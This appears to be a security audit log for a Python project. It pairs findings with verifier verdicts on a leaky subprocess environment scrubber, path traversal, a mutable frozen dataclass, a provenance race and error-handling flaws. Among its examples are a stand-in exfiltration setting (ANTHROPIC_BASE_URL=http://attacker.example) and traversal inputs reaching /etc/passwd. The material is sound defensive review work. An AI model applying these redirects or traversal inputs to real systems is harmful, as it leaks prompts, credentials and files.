finding.title: Credential scrubber lets the high-stakes subprocess be redirected off-box (data exfiltration) and switched to a metered provider
finding.description:
scrubbed_env() (the env passed to the claude_agent_sdk subprocess at line 336) only removes vars whose NAME contains 'KEY' or 'TOKEN' under the ANTHROPIC_ prefix (is_metered_anthropic_credential, lines 113-120). It is a deny-by-name filter, not an allowlist, so every other environment variable is forwarded verbatim to the Claude CLI/Agent SDK subprocess. Multiple Claude Code env vars that contain neither 'KEY' nor 'TOKEN' subvert the two hard invariants this module exists to enforce:

1) DATA SOVEREIGNTY (ADR-0003) bypass: ANTHROPIC_BASE_URL (and ANTHROPIC_BEDROCK_BASE_URL / ANTHROPIC_VERTEX_BASE_URL, HTTP_PROXY/HTTPS_PROXY, CLAUDE_CODE_API_KEY_HELPER) redirect where the subprocess sends requests. The high-stakes prompt is the full analysis content; setting ANTHROPIC_BASE_URL=http://attacker.example sends every prompt off the box. This is also a clean SSRF/exfiltration channel through a configurable endpoint.

2) 'NO METERED API' bypass: CLAUDE_CODE_USE_BEDROCK=1 / CLAUDE_CODE_USE_VERTEX=1 make the CLI route through AWS Bedrock / GCP Vertex — metered, per-token billing — without any ANTHROPIC_*KEY/TOKEN ever appearing. The accompanying AWS_*/GOOGLE_* credentials (e.g. AWS_SECRET_ACCESS_KEY) are also forwarded since they lack the ANTHROPIC_ prefix.

Verified against the venv: with all of ANTHROPIC_BASE_URL, ANTHROPIC_BEDROCK_BASE_URL, CLAUDE_CODE_USE_BEDROCK, CLAUDE_CODE_USE_VERTEX, HTTP_PROXY, HTTPS_PROXY, ANTHROPIC_VERTEX_BASE_URL, CLAUDE_CODE_API_KEY_HELPER, AWS_SECRET_ACCESS_KEY set, scrubbed_env() returned every one of them KEPT. claude-agent-sdk 0.2.102 is installed and ClaudeAgentOptions(env=scrubbed_env()) hands that dict to the subprocess.
finding.suggested_fix: Make the subprocess env a strict allowlist instead of a name-based denylist, OR extend the denylist to strip the provider-redirecting / metered-provider switches. Concretely: also drop ANTHROPIC_BASE_URL, ANTHROPIC_BEDROCK_BASE_URL, ANTHROPIC_VERTEX_BASE_URL, CLAUDE_CODE_USE_BEDROCK, CLAUDE_CODE_USE_VERTEX, CLAUDE_CODE_API_KEY_HELPER, HTTP_PROXY, HTTPS_PROXY, ALL_PROXY (and their lowercase forms), and AWS_*/GOOGLE_APPLICATION_CREDENTIALS provider creds; preferably build the child env from an explicit allowlist (PATH, HOME, CLAUDE_CODE_OAUTH_TOKEN, locale) plus only known-safe vars. If a custom on-box base URL must be supported, route it through require_loopback_url first.

verdicts.reasoning:
CONFIRMED, and the real impact is broader than the original report.

Code facts (src/assay_engine/reasoning/seam.py): is_metered_anthropic_credential (L113-120) is a name-based DENYLIST that matches only ANTHROPIC_* vars containing 'KEY' or 'TOKEN'. scrubbed_env() (L123-129) returns os.environ minus those keys and nothing else, and is the only env control; it is handed to the subprocess via ClaudeAgentOptions(env=scrubbed_env()) at L336. No code anywhere in src/ clears or mutates os.environ before the call (grep confirmed).

PoC #1 (venv, claude-agent-sdk 0.2.102): scrubbed_env() KEPT every redirect/metered switch — ANTHROPIC_BASE_URL, ANTHROPIC_BEDROCK_BASE_URL, ANTHROPIC_VERTEX_BASE_URL, CLAUDE_CODE_USE_BEDROCK, CLAUDE_CODE_USE_VERTEX, CLAUDE_CODE_API_KEY_HELPER, HTTP_PROXY, HTTPS_PROXY, ALL_PROXY, AWS_SECRET_ACCESS_KEY, GOOGLE_APPLICATION_CREDENTIALS — and only DROPPED ANTHROPIC_API_KEY / ANTHROPIC_AUTH_TOKEN. These are real, documented Claude Code env settings: ANTHROPIC_BASE_URL redirects where the subprocess sends the (full analysis) prompt off-box (ADR-0003 data-sovereignty bypass / exfiltration channel); CLAUDE_CODE_USE_BEDROCK/USE_VERTEX route through metered AWS Bedrock / GCP Vertex (the 'no metered API' invariant bypass) with the accompanying AWS_*/GOOGLE_* creds forwarded too.

PoC #2 — additional defect I found by reading the SDK source: claude_agent_sdk 0.2.102 subprocess_cli.py (L429-435) builds the child env as process_env = {**inherited_env, ...defaults, **options.env}, i.e. it MERGES options.env ON TOP of the full inherited os.environ rather than using it as the child env. Because scrubbed_env() *omits* the metered keys rather than setting them empty, the omitted key falls through to its inherited value. Replicating the exact merge proved ANTHROPIC_API_KEY='sk-metered-SHOULD-BE-REMOVED' and ANTHROPIC_AUTH_TOKEN both survive into the final child env even though scrubbed_env() correctly excluded them. So the module's PRIMARY documented purpose — stripping the metered Anthropic key before the subprocess sees it — is itself a no-op against the installed dependency.

Note: tests/test_reasoning.py L38-39 and L50/55 deliberately assert ANTHROPIC_BASE_URL is 'not a credential' and is KEPT, so the redirect leak is a documented/intended design choice — but it directly contradicts the module's own docstring and ADR-0003, and the test never exercises the actual SDK merge, so it gives false confidence that the metered key is stripped.

This is the single enforcement boundary for the two hard invariants the module exists to uphold, and both are bypassable. Exploitation requires control of the process environment on a local-first single-tenant box (no remote/unprivileged trigger), which is why this is HIGH rather than CRITICAL.

Fix note: the original 'strict allowlist via options.env' suggestion is INSUFFICIENT given this SDK's merge semantics — any non-listed inherited var still leaks. A correct fix must either (a) os.environ.pop the dangerous vars in the engine process before the call, or (b) explicitly overwrite each dangerous var (including the metered KEY/TOKEN, base-URL, proxy, and provider-switch vars) to a removed/empty sentinel inside options.env, AND route any custom on-box base URL through require_loopback_url (already available in _local.py but unused here).
verdicts.evidence: Read src/assay_engine/reasoning/seam.py (is_metered_anthropic_credential L113-120, scrubbed_env L123-129, env=scrubbed_env() at L336). Read src/assay_engine/_local.py (require_loopback_url exists but is NOT applied to subprocess env). Read tests/test_reasoning.py L38-56 (explicitly asserts ANTHROPIC_BASE_URL kept — documented design choice). grep over src/ confirmed no os.environ mutation/clearing anywhere. PoC #1 against /Users/[REDACTED]/hc-assay/.venv: scrubbed_env() returned all redirect/metered/proxy/cloud-cred vars KEPT. PoC #2: read claude_agent_sdk 0.2.102 _internal/transport/subprocess_cli.py L429-435 showing process_env = {**inherited_env, ..., **self._options.env, ...} (merge over full os.environ), then replicated the merge to prove ANTHROPIC_API_KEY and ANTHROPIC_AUTH_TOKEN survive into the child env despite scrubbed_env() excluding them — the scrubber's primary purpose is defeated by the installed SDK. SDK version confirmed 0.2.102 via pip show.

verdicts.reasoning:
Confirmed a genuine production-readiness defect. scrubbed_env() (src/assay_engine/reasoning/seam.py:123-129) filters the child env with is_metered_anthropic_credential (lines 113-120), which only drops vars matching ANTHROPIC_* AND ('KEY' or 'TOKEN'). This is a deny-by-name filter, not an allowlist, so every other env var is forwarded to the high-stakes subprocess (env=scrubbed_env() at line 336).

This breaks both hard invariants this module exists to enforce:
1) Data sovereignty (ADR-0003): ANTHROPIC_BASE_URL / ANTHROPIC_BEDROCK_BASE_URL / ANTHROPIC_VERTEX_BASE_URL / HTTP(S)_PROXY / ALL_PROXY / CLAUDE_CODE_API_KEY_HELPER all survive scrubbing and are honored by the Claude CLI, redirecting where the subprocess sends the full high-stakes analysis prompt — a clean off-box exfiltration/SSRF channel.
2) No metered API: CLAUDE_CODE_USE_BEDROCK / CLAUDE_CODE_USE_VERTEX survive and route the CLI through metered Bedrock/Vertex billing without any ANTHROPIC_*KEY/TOKEN; the accompanying AWS_SECRET_ACCESS_KEY / GOOGLE_APPLICATION_CREDENTIALS also pass through.

Notably, the BULK tier guards its base URL with require_loopback_url (seam.py:251, 554), and require_loopback_url exists in _local.py — but no equivalent guard or allowlist is applied to the inherited environment for the HIGH_STAKES subprocess, so the sovereignty control is simply absent on this path.

The precondition (attacker/misconfig able to set process env vars) keeps this from being remotely exploitable on its own, which is why it is HIGH rather than CRITICAL — but this is a dedicated security/sovereignty firewall that provably fails open against its single most direct bypass (one ANTHROPIC_BASE_URL var ships every prompt off-box). The suggested fix is correct: prefer a strict allowlist child env, or at minimum extend the denylist to the provider-redirect/metered-switch/proxy/cloud-cred vars and route any on-box base URL through require_loopback_url.
verdicts.evidence:
Read src/assay_engine/reasoning/seam.py lines 90-129 (is_metered_anthropic_credential / scrubbed_env) and 300-379 (ClaudeAgentOptions(env=scrubbed_env()) at line 336). grep showed require_loopback_url is applied to BULK_BASE_URL (lines 251, 554) but never to the high-stakes inherited env.

PoC against venv (.venv/bin/python, claude-agent-sdk 0.2.102): set ANTHROPIC_BASE_URL, ANTHROPIC_BEDROCK_BASE_URL, ANTHROPIC_VERTEX_BASE_URL, CLAUDE_CODE_USE_BEDROCK, CLAUDE_CODE_USE_VERTEX, CLAUDE_CODE_API_KEY_HELPER, HTTP_PROXY, HTTPS_PROXY, ALL_PROXY, AWS_SECRET_ACCESS_KEY, GOOGLE_APPLICATION_CREDENTIALS, ANTHROPIC_API_KEY, ANTHROPIC_AUTH_TOKEN, CLAUDE_CODE_OAUTH_TOKEN; scrubbed_env() KEPT all redirect/metered/cloud-cred vars and CLAUDE_CODE_OAUTH_TOKEN, and DROPPED only ANTHROPIC_API_KEY and ANTHROPIC_AUTH_TOKEN.

Confirmed the env reaches the real subprocess: claude_agent_sdk/_internal/transport/subprocess_cli.py lines 430-480 build process_env = {**os.environ (minus CLAUDECODE), 'CLAUDE_CODE_ENTRYPOINT':'sdk-py', **self._options.env, 'CLAUDE_AGENT_SDK_VERSION':...} and pass env=process_env to anyio.open_process. options.env (= scrubbed_env()) thus fully populates the child env handed to the claude CLI.

finding.title: LocalDataVersioner.path_for performs no version-id validation, enabling path traversal outside the store
finding.description: path_for(digest) builds self._root / digest[:2] / digest with no validation that digest is a hex SHA-256. A caller passing a digest sourced from untrusted data (e.g. a version id round-tripped through provenance records or a model/JSON reply) can escape the store: path_for('../../etc/passwd') -> /tmp/store/../../../etc/passwd, path_for('/etc/passwd') -> /etc/passwd (verified against the venv). LocalDataVersioner and this method are part of the exported public persistence API (persistence/__init__.py), so an adapter that retrieves an artifact by an externally-influenced id can read/return files outside the content-addressed store. The engine's own callers currently only pass digests produced by fingerprint()/put(), so exploitability depends on adapter usage — hence LOW — but the method offers no guard.
finding.suggested_fix: Validate the digest before composing the path: reject anything not matching ^[0-9a-f]{64}$ (raise ValueError), or after resolving assert the result is within self._root.resolve() (Path.is_relative_to). Apply the same check in any future getter that maps an id to a filesystem path.

verdicts.reasoning:
Confirmed genuine defect. LocalDataVersioner.path_for(digest) at src/assay_engine/persistence/versioning.py:82-84 composes self._root / digest[:2] / digest with no validation that digest is a 64-char hex SHA-256. I reproduced the traversal against the venv (.venv/bin/python): path_for('../../etc/passwd') -> /tmp/store_test/../../../etc/passwd (resolves to /private/etc/passwd, outside root), and path_for('/etc/passwd') -> /etc/passwd because an absolute component resets the Path entirely. I confirmed an is_relative_to(self._root.resolve()) check returns False for the resolved traversal path, so the suggested guard would catch it.

Exploitability is genuinely LOW, matching the original rating: LocalDataVersioner and path_for are exported in persistence/__init__.py __all__ as public API intended for adapters to fetch artifacts by id. All engine-internal callers pass ids produced by put()/fingerprint() (validated hexdigests) — see pipeline.py:283 source_version = versioner.put(...) and the test usages — so there is no live exploit path inside the engine today. The risk is a defense-in-depth gap: version ids round-trip through provenance/result records (pipeline source_version) and the method is offered to adapters with no guard, so an adapter that retrieves an artifact by an externally-influenced id could read/return files outside the content-addressed store. This is a real production-readiness hardening defect on a security-relevant (data-sovereignty) boundary, not a style nit and not justified by any hard constraint. The fix (regex ^[0-9a-f]{64}$ reject, or post-resolve is_relative_to assertion) is correct and cheap.
verdicts.evidence: Read src/assay_engine/persistence/versioning.py (path_for at lines 82-84, no validation; contrast with put() which derives digest from fingerprint()). Read persistence/__init__.py confirming LocalDataVersioner is in __all__ (public API). grep showed path_for callers: only tests (test_persistence.py:247,388; test_pipeline.py:294) and engine code passing put()-derived ids (pipeline.py:283). PoC via .venv/bin/python: path_for('../../etc/passwd') -> PosixPath('/tmp/store_test/../../../etc/passwd'), .resolve() -> /private/etc/passwd; path_for('/etc/passwd') -> PosixPath('/etc/passwd'); is_relative_to(root.resolve()) on the resolved traversal returned False (guard would work).

verdicts.reasoning:
Confirmed at the code and runtime level. src/assay_engine/persistence/versioning.py:82-84 — path_for(digest) returns self._root / digest[:2] / digest with zero validation of the digest. PoC against the venv reproduces the traversal: path_for("../../../../../../etc/passwd").resolve() -> /private/etc/passwd (escapes the store) and path_for("/etc/passwd") -> /etc/passwd (Path.__truediv__ discards the left operand when the right is absolute). Edge cases also break sharding: path_for("") -> the store root itself, path_for("..") -> store/../.. .

It is a TRUE defect, not a false positive, but strictly defensive/latent. I verified every caller: the only engine consumers (pipeline.py source-version flow; tests) obtain the digest from versioner.put()/fingerprint(), which always return hashlib.sha256().hexdigest() — never untrusted data. There is no in-engine path that feeds a provenance id, model/JSON reply, or other external input into path_for, so the "round-tripped through provenance" exploit is hypothetical within this repo. The genuine basis is that LocalDataVersioner.path_for is an exported public API (persistence/__init__.py:27,39), so a third-party adapter that maps an externally-influenced id to a path would have no guard. None of the hard constraints (local-first, lazy backends, no-adapter-imports) justify omitting the check — it is pure logic on a public method.

Severity LOW is correct (I agree with the prior assessor and the recalibration sustains it): no in-repo exploit, path_for only builds a Path (it does not itself read or return file bytes — an adapter would have to open it), and triggering requires an adapter to violate the documented "by its version id" contract by passing attacker-controlled input. Cheap, correct fix: reject anything not matching ^[0-9a-f]{64}$ (raise ValueError) before composing the path, or resolve-and-assert is_relative_to(self._root.resolve()).
verdicts.evidence: Read src/assay_engine/persistence/versioning.py (path_for at 82-84 has no validation; put() returns a true SHA-256 hexdigest). Read persistence/__init__.py (LocalDataVersioner and the class are exported in __all__). grep of src/ and tests/ for path_for/put/fingerprint usage: only callers pass digests from put()/fingerprint(); no untrusted source reaches path_for. PoC via /Users/[REDACTED]/hc-assay/.venv/bin/python: path_for("../../../../../../etc/passwd").resolve() == /private/etc/passwd; path_for("/etc/passwd") == /etc/passwd; path_for("") == store root; path_for("..") == store/../.. .

finding.title: GateReview is a frozen dataclass whose Mapping payload is not frozen — mutable-in-place and unhashable (issue #7 escape)
finding.description:
GateReview is declared @dataclass(frozen=True, slots=True) with a `payload: Mapping[str, Any]` field but, unlike EVERY other frozen mapping-bearing value record in the engine (ProvenanceEntry, GateDecision, Corpus, ClaimRecord, Verdict, Hypothesis, BaselineArtifact, ReasoningRequest, etc.), it has no __post_init__ that normalizes the field through freeze_mapping. This reproduces both halves of the codebase's own documented issue #7 (see src/assay_engine/_frozen.py module docstring):

1. Mutable-in-place: `frozen=True` only blocks attribute rebinding; the contained dict stays live, so a 'frozen' GateReview can be silently altered after construction AND it aliases whatever dict was passed in. PoC against the venv: `gr = GateReview(...payload=shared); gr.payload['k']='MUTATED'` succeeds and `shared['k']` becomes 'MUTATED'.
2. Unhashable: `frozen=True` auto-generates __hash__ over all fields, so the instance *looks* hashable but `hash(gr)` raises `TypeError: unhashable type: 'dict'` (verified in venv). It cannot be put in a set/dict or used as a cache key despite being frozen.

GateReview is the packet handed to the caller-supplied `gate_handler` (a trust boundary the surrounding code otherwise treats defensively, e.g. provenance.as_recorder reads gate decisions defensively against 'booby-trapped' objects). A handler can mutate review.payload in place. The two in-tree construction sites (pipeline.py:394, :440) pass fresh dict literals, so there is no leak back to an external caller *today*, but the immutability/hashability guarantee the `frozen=True` annotation advertises is false.

verdicts.reasoning:
The finding is technically accurate and reproduces against the venv. GateReview (src/assay_engine/pipeline.py:72-80) is declared @dataclass(frozen=True, slots=True) with a payload: Mapping[str, Any] field but lacks the __post_init__ that normalizes the field through freeze_mapping. I verified that EVERY sibling frozen mapping-bearing record does this normalization: GateDecision (gates.py:48-49), ProvenanceEntry (provenance.py:64-65), Corpus/schema records (schema.py:44,62,77+89), ClaimRecord (claims.py:37-39), Hypothesis (hypothesis.py:80-83), Verdict (verdict.py:39-40), BaselineArtifact (toolkit.py:38-40). GateReview is the sole omission, and the codebase explicitly documents this exact two-part hazard as issue #7 in _frozen.py's module docstring. My PoC confirmed both halves: (1) gr.payload['k']='MUTATED' succeeds on a 'frozen' instance and aliases the input dict, and (2) hash(gr) raises TypeError: unhashable type: 'dict' — while the sibling GateDecision correctly rejects mutation (FrozenDict has no item assignment) and is hashable.

However, severity should be recalibrated DOWN from MEDIUM to LOW. There is no live failure path in the current code: the only two construction sites (pipeline.py:394 and :440) pass fresh dict literals, so no external dict is aliased, and nothing in the engine hashes a GateReview or relies on its immutability — the gate handlers (auto_approve, the tests at test_pipeline.py:182/230) only read review.payload. So today there is no data-corruption or crash path. The residual issue is a false advertisement of the frozen=True/hashable contract on a public-API value record (exported via __init__.py) handed across the gate-handler trust boundary — a real consistency/contract defect, but latent. The suggested fix is exactly the engine's own established one-line pattern and is correct.
verdicts.evidence: Read src/assay_engine/pipeline.py:72-80 (GateReview has no __post_init__) and construction sites :394, :440 (fresh dict literals). Read src/assay_engine/_frozen.py (documents issue #7: frozen-but-mutable + looks-hashable-but-raises; freeze_mapping is the normalizer). grep confirmed all sibling records use __post_init__ + freeze_mapping (gates.py:48-49, provenance.py:64-65, schema.py:44/62/77/89, claims.py:37-39, hypothesis.py:80-83, verdict.py:39-40, toolkit.py:38-40). Ran PoC in .venv: 'gr.payload[k]=MUTATED' succeeded, shared input dict aliased to 'MUTATED', hash(gr) raised TypeError: unhashable type: 'dict'; contrast GateDecision rejected mutation ('FrozenDict object does not support item assignment') and hashed fine. grep for GateReview/payload usage shows only literal-dict constructions and read-only handler access (test_pipeline.py:182,230) — no live hash or external-dict path, hence LOW not MEDIUM. GateReview is exported in src/assay_engine/__init__.py:46/81 (public API across the gate-handler trust boundary).

verdicts.reasoning:
Independently confirmed and reproduced against the venv. GateReview (src/assay_engine/pipeline.py:72-80) is @dataclass(frozen=True, slots=True) with payload: Mapping[str, Any] but has no __post_init__ to normalize payload through freeze_mapping. This deviates from the engine-wide invariant: ProvenanceEntry (provenance.py:64-65), GateDecision (gates.py:48-49), and the schema records (schema.py:44/62/89) all route their mapping fields through freeze_mapping in __post_init__, exactly to fix the documented issue #7 (see _frozen.py module docstring). GateReview is the single record that re-opens both halves of #7. PoC against /Users/[REDACTED]/hc-assay/.venv confirms both symptoms.

It is a genuine production-readiness defect: the frozen=True annotation advertises immutability and (via auto-generated __hash__) hashability, and both are false for GateReview — a trust-boundary packet handed to a caller-supplied gate_handler. The fix is the same one-line __post_init__ every sibling already uses, so it is low-risk and consistency-restoring.

Severity recalibrated MEDIUM->LOW: the two in-tree construction sites (pipeline.py:399 and :445) both pass fresh dict literals (verified), so no external dict is aliased today, and the two consumers (auto_approve, run_gate at pipeline.py:232-248) only read scalar fields (gate/frm/to) — they never hash the review nor depend on payload immutability. There is therefore no live correctness or concurrency exploit; the harm is latent (a future handler/caller that hashes a GateReview, caches it, or constructs one from a shared dict would hit the broken guarantee). A latent broken invariant on a trust boundary is real but not actively exploited, hence LOW rather than MEDIUM.

Read src/assay_engine/_frozen.py (module docstring documents issue #7; freeze_mapping at :105-107). grep confirmed sibling records normalize via freeze_mapping/__post_init__: provenance.py:64-65, orchestration/gates.py:48-49, contracts/schema.py:44/62/89. PoC run with /Users/[REDACTED]/hc-assay/.venv/bin/python output: 'aliased external dict mutated: True', 'payload type: dict', 'hash FAILED: unhashable type: dict' — reproducing both the in-place mutation/aliasing and the unhashable-despite-frozen symptoms.

finding.title: ProvenanceTrail.record performs a non-atomic check-then-act on shared list state (not thread-safe)
finding.description:
record() computes `seq = len(self._entries)` and `prev_hash = self._entries[-1].entry_hash` (read), then does work (clock, digest, freeze), then `self._entries.append(entry)` (write), with no lock. If a single ProvenanceTrail were shared across threads, two concurrent record() calls could read the same seq/prev_hash and append two entries that both claim e.g. seq=N with the same prev_hash, breaking the chain so verify_records() (which asserts e.seq == i and e.prev_hash == prev) would fail — a corrupted append-only audit trail, the exact 'no step can be removed or reordered' guarantee the trail exists to provide.

Current exposure is latent, not live: run_study (pipeline.py) drives the trail strictly single-threaded, and as_recorder() — the only path that hands a trail-bound recorder to external code — is defined but not wired anywhere in the engine, and the reasoning ThreadPoolExecutor does not touch the trail. The docstring also scopes the trail to 'one study run.' Severity is LOW because no concurrent caller exists today, but the class offers a public record()/as_recorder() API with no documented single-thread constraint, so a future concurrent gate/recorder wiring would silently corrupt provenance.
finding.suggested_fix: Guard the read-compute-append sequence with a threading.Lock held across the seq/prev_hash read through the append (or document the trail as single-thread-only and assert it). Given record() also calls an injected clock and a hashing step, hold the lock for the whole method to keep seq/prev_hash/entry_hash mutually consistent.

verdicts.reasoning:
CONFIRMED as a real but latent production-readiness defect; original LOW severity is correct.

Technical claim verified by reading src/assay_engine/provenance.py:112-150. record() reads shared mutable state without a lock — seq=len(self._entries) (line 116) and prev_hash=self._entries[-1].entry_hash (line 117) — then does clock/normalize/_digest work (lines 118-134), then appends (line 149). The read-compute-append is a non-atomic check-then-act on self._entries. I reproduced the corruption with a PoC against the venv: by wedging _digest behind a 2-thread Barrier (widening the window between the seq/prev read and the append), two concurrent record() calls both read seq=0/prev_hash=genesis and append two entries both claiming seq=0, and verify_records() then raised 'provenance entry 1 has seq 0 (reordered or removed)'. So a shared trail under concurrency would silently corrupt the append-only chain — the exact 'no step removed or reordered' guarantee the trail exists to provide (GOVERNANCE §3, module docstring).

Exposure analysis in the finding is accurate; I independently confirmed every part: (1) run_study in pipeline.py is strictly single-threaded — all ~15 trail.record calls are inline within sequential phase spans (enter(), run_gate(), track() all call record() synchronously, lines 221/230/237/250/284/322/342/365/386/417/458/465/488/509). (2) The only ThreadPoolExecutor (reasoning/seam.py:136) executes only backend-call closures via _submit_bounded/_with_timeout; grep for trail|provenance|recorder in src/assay_engine/reasoning/ returns nothing that touches the trail. (3) as_recorder() (provenance.py:152) is defined and tested but NOT wired anywhere in the engine — gates.py:74-98 accept a ProvenanceRecorder, but pipeline.py uses inline run_gate/trail.record, never as_recorder, and still single-threaded. (4) A fresh ProvenanceTrail is created per run (pipeline.py:215) and the docstring scopes it to 'one study run.' So no concurrent caller exists today; the defect is latent.

Not a false positive: it is a genuine class-level defect (public record()/as_recorder() API over shared mutable state, no lock, no documented single-thread constraint, no assertion). It is not excluded by any hard constraint. The team locks shared state elsewhere when concurrency is real (registry.py _LOCK, tracing.py _provider_lock, checkpoint.py _init_lock, seam.py _inflight_lock), so a lock here (or an explicit single-thread assertion/doc) is consistent with the codebase's own standard. Severity LOW is correct: zero live exposure today, but a future concurrent gate/recorder wiring would silently corrupt the integrity spine, and there is nothing in the API to prevent that.
verdicts.evidence: Read src/assay_engine/provenance.py (full): record() lines 116-117 read self._entries (seq, prev_hash), line 149 appends — no lock; verify_records() lines 224-226 assert e.seq==i and e.prev_hash==prev. PoC against /Users/[REDACTED]/hc-assay/.venv/bin/python: monkeypatched _digest behind a threading.Barrier(2), ran 2 threads calling record() on one shared trail; result was 2 entries with seqs [0,0] and verify_records raised 'provenance entry 1 has seq 0 (reordered or removed)' — concrete chain corruption. finding.title: Measurement↔Interpretation fence misses dict keys (and non-container objects): an Interpretation can be smuggled into a Measurement
finding.description:
METHODOLOGY.md §6 and the fence.py docstring state the fence "refuses at construction to hold an Interpretation (even nested)" and the Measurement.__post_init__ comment claims it is blocked "at the top level OR nested in a container/metadata (issues #22, #30)." The recursive guard _contains_interpretation does NOT honor that for two cases, both reproducible against the venv:

1) Mapping KEYS. _contains_interpretation recurses only into Mapping VALUES (`any(_contains_interpretation(v) for v in obj.values())`, line 44). An Interpretation is frozen+hashable, so it is a legal dict key. PoC: `Measurement(value={interp: 'x'}, produced_by='p', inputs_hash='h')` constructs successfully — the Measurement now structurally contains an Interpretation. This is an incompleteness inside the very container type (Mapping) the guard explicitly claims to cover, not an out-of-scope custom object.

2) Arbitrary objects / frozen dataclasses. The guard only descends into Mapping/list/tuple/set/frozenset. PoC: a one-field `@dataclass(frozen=True) Wrap(payload)` holding the Interpretation passes the check; `freeze()` also does not descend into dataclasses, so the Interpretation survives intact inside the constructed Measurement.

Effect: judgment (e.g. LLM output that the methodology requires be wrapped as an Interpretation) can be laundered into a value typed as a Measurement, which is exactly what the one-way fence exists to prevent — once it is a Measurement it may legally feed the baseline/verdicts upstream. The existing fence tests (tests/test_stubs_and_baseline.py) cover top-level, list, and metadata-VALUE nesting only, so neither bypass is caught.
finding.suggested_fix: In _contains_interpretation, for the Mapping branch also scan keys: `any(_contains_interpretation(k) or _contains_interpretation(v) for k, v in obj.items())`. That closes case (1) fully and is a small, contained change. For case (2), either (a) tighten the docstrings/METHODOLOGY §6 to state explicitly that the structural guard covers only JSON-native containers and that wrapping judgment in a custom object defeats it (matching the honest-scope framing already used elsewhere), or (b) extend the guard to descend into dataclass instances via dataclasses.fields(). Add fence tests for an Interpretation as a dict key and inside a frozen dataclass.

verdicts.reasoning:
VERIFIED REAL (partially). I read /Users/[REDACTED]/hc-assay/src/assay_engine/methodology/fence.py and reproduced both PoCs against the venv.

CASE 1 (Mapping KEYS) — GENUINE DEFECT. _contains_interpretation (line 44-45) recurses only into Mapping VALUES (`any(_contains_interpretation(v) for v in obj.values())`), never keys. Interpretation is `@dataclass(frozen=True, slots=True)` so it is hashable and is a legal dict key. PoC: `Measurement(value={interp: "x"}, produced_by="p", inputs_hash="h")` constructs successfully and the Interpretation survives intact as a FrozenDict key (verified: `interp survives in value: True`). This is an incompleteness INSIDE the very container type (Mapping) the guard explicitly descends into, and it directly contradicts the in-code claim at __post_init__ (lines 61-64) that nesting "in a container/metadata" is blocked, plus METHODOLOGY.md §6 line 118 ("even nested"). The suggested one-line fix (scan keys too) is correct and contained. This is a true, if low-impact, bug.

CASE 2 (custom/frozen-dataclass wrapper) — NOT A DEFECT (documented scope). PoC reproduces (a frozen `Wrap(payload=interp)` passes), but METHODOLOGY.md §6 (lines 115-124) already explicitly and honestly scopes the fence as a "type-level boundary, not an automatic whole-pipeline retrofit" that "does not, and cannot, retro-classify arbitrary study values it never sees." Wrapping judgment in a custom object is exactly such an arbitrary value; descending into all dataclasses is unbounded and out of scope. This half is a justified, already-documented design limitation, not a production defect. (The inline comment is slightly looser than the docstring but "container" is reasonably read as JSON-native containers.)

SEVERITY recalibration: assessor said MEDIUM; I lower to LOW. Two mitigating facts: (a) `Measurement` is a standalone opt-in type-boundary primitive — grep shows the engine itself never feeds Measurement.value into the baseline/verdict path (no internal consumer; only exported in methodology/__init__.py), so the "laundered into the baseline" effect requires a study to both adopt these types AND construct an Interpretation as a dict key, an unusual shape; (b) only the key-scan half is a real bug. Real but edge-triggered and currently not on any live data path, hence LOW rather than MEDIUM.

Read fence.py (lines 40-72) and _frozen.py (freeze: Mapping→FrozenDict freezing keys-as-is, values recursively). Ran two PoCs with /Users/[REDACTED]/hc-assay/.venv/bin/python:

However this is closer to the explicitly honest-scoped caveat in METHODOLOGY.md:123-124 ("does not, and cannot, retro-classify arbitrary study values it never sees"). Triggering either bypass requires the study author to deliberately place an Interpretation as a dict key or inside a custom wrapper — it never arises from the normal fence()/Interpretation API. finding.title: Pool-saturation guard raises PermanentReasoningError for a transient condition, so concurrent callers fail with no retry or backpressure
finding.description: When all 8 worker slots are in-flight (e.g. 8 concurrent slow/hung backend calls), `_submit_bounded` raises `PermanentReasoningError` (line 153). But `_run_with_retries` catches `PermanentReasoningError` FIRST and re-raises immediately with no retry and no backoff (seam.py:448-449). Saturation is a *temporary* contention/backpressure condition, not a permanent fault, yet it is classified as fatal. PoC: filling all 8 slots with hung calls that time out at 0.2s leaves `_inflight==8`; a subsequent trivial fast call is refused with `PermanentReasoningError("reasoning timeout pool saturated")`. After the hung threads return, `_inflight` correctly returns to 0 — proving the condition is transient — but any caller that hit the window already got a non-retryable hard failure. Under modest concurrency this turns brief pressure into widespread permanent-looking failures (no backpressure/queueing).
finding.suggested_fix: Raise a retryable signal on saturation instead of `PermanentReasoningError` — e.g. a `RateLimitError`/dedicated backpressure error that `_run_with_retries` retries with bounded backoff — or block with a bounded wait (semaphore acquire with timeout) so callers queue briefly rather than fail. Reserve `PermanentReasoningError` for genuinely unrecoverable saturation (e.g. confirmed-hung slots that never drain past a deadline).

verdicts.reasoning:
The finding is a genuine reliability/resource-management defect, confirmed by code reading and two PoCs.

MECHANICS (verified by reading): `_submit_bounded` (seam.py:152-156) raises `PermanentReasoningError` when `_inflight >= 8`. `_run_with_retries` (seam.py:448-449) catches `PermanentReasoningError` FIRST and re-raises immediately — no retry, no backoff. `PermanentReasoningError` (line 69) is NOT a subclass of `RateLimitError` (line 73), so it never reaches the rate-limit retry budget (lines 450-454, default 5 retries with backoff). There is no semaphore/queue/bounded-wait anywhere (grep confirmed) — the submit path is strictly fail-fast.

TRANSIENCE PROVEN (PoC #1): filling all 8 slots with blocked workers gives inflight=8; a fast call is refused with `PermanentReasoningError("reasoning timeout pool saturated (8/8 in-flight)")`; after the workers return, inflight drains to 0 and a fresh fast call succeeds. The condition self-heals — it is not permanent.

DECISIVE PoC #2: 12 concurrent LEGITIMATE non-hung 0.5s calls against the 8-worker pool → 8 succeed, 4 receive `PermanentReasoningError`. No hung threads required. Slots are merely busy with healthy in-progress calls. The `FuturesTimeout` branch (seam.py:174-176) intentionally keeps a slot occupied for the full backend-call duration, so slow-but-healthy concurrent calls saturate the pool exactly like hung calls do, and the guard cannot distinguish the two cases. The suggested fix (raise a retryable RateLimitError, or bounded semaphore acquire) is mechanically valid because RateLimitError IS retried by the existing loop.

